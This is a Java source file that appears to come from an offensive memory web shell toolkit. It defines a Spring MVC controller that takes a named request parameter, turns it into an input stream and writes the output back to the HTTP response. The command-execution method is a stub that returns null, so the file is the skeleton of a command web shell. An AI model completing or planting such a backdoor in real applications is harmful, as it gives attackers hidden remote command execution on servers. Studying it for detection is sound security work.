package com.reajason.javaweb.memshell.shelltool.command;

import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.mvc.Controller;

import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;

/**
 * @author ReaJason
 * @since 2024/12/22
 */
public class CommandControllerHandler implements Controller {
    public static String paramName;

    public ModelAndView handleRequest(HttpServletRequest request, HttpServletResponse response) throws Exception {
        try {
            String param = getParam(request.getParameter(paramName));
            if (param != null) {
                InputStream inputStream = getInputStream(param);
                ServletOutputStream outputStream = response.getOutputStream();
                byte[] buf = new byte[8192];
                int length;
                while ((length = inputStream.read(buf)) != -1) {
                    outputStream.write(buf, 0, length);
                }
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return null;
    }

    private String getParam(String param) {
        return param;
    }

    private InputStream getInputStream(String param) throws Exception {
        return null;
    }
}
